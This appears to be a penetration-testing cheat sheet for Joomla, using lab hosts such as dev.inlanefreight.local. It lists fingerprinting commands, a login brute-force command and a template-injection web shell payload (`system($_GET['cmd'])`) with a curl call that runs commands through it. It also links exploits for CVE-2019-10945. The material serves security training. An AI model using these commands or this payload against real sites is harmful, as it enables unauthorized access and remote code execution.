# Joomla

## **Introduction**

> * CMS used for discussion forums, photo galleries, e-Commerce, user-based communities, and more.
> * Written in PHP and uses MySQL in the backend.

***

## **Joomla Discovery/Footprinting**

| Command                                                                                                 | Description                                                                                   |
| ------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------- |
| `droopescan scan joomla --url http://dev.inlanefreight.local`                                           | Enumeration via `droopescan`                                                                  |
| `python2.7 joomlascan.py -u http://dev.inlanefreight.local`                                             | Enumeration via `joomlascan.py`                                                               |
| `curl -s http://dev.inlanefreight.local/ \| grep Joomla`                                                | Check Webpage Source                                                                          |
| `curl -s http://dev.inlanefreight.local/administrator/manifests/files/joomla.xml \| xmllint --format -` | Some Joomla versions may be fingerprinted from this file                                      |
| Browse to `http://dev.inlanefreight.local/plugins/system/cache/cache.xml`                               | The `cache.xml` file can give out an `approximate version` of Joomla                          |
| Browse to `http://dev.inlanefreight.local/media/system/js/`                                             | Some versions of Joomla can be fingerprinted by analyzing the javascript files in this folder |
| Browse to `http://blog.inlanefreight.local/robots.txt`                                                  | Check for references to Joomla                                                                |
| Browse to `http://dev.inlanefreight.local/README.txt`                                                   | Check the README file to look for references to Joomla                                        |

***

## **Joomla Users and Login Bruteforcing**

* **Administrator account:**\
  The default administrator account is admin, but the **password is set at install time**
* You can perform login broteforce by using the following: [https://github.com/ajnik/joomla-bruteforce](https://github.com/ajnik/joomla-bruteforce)
* PoC: `sudo python3 joomla-brute.py -u http://dev.inlanefreight.local -w /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt -usr admin`

***

## **Joomla Known Vulnerabilities**

1. **PHP TEMPLATE CODE INJECTION TO RCE \[Requires Admin Account]**
   * The basic idea is to add PHP code inside a template
   * Login as Admin → Navigate to Configuration → Select a Template → Select an existing PHP file → add the following payload:
   * `system($_GET['cmd']);`
   * `curl -s http://dev.inlanefreight.local/templates/protostar/error.php?cmd=id`
2. **Joomla 3.9.4 directory traversal** [**CVE-2019-10945**](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945)
   * Exploit 1: https://www.exploit-db.com/exploits/46710
   * Exploit 2: https://github.com/dpgg101/CVE-2019-10945
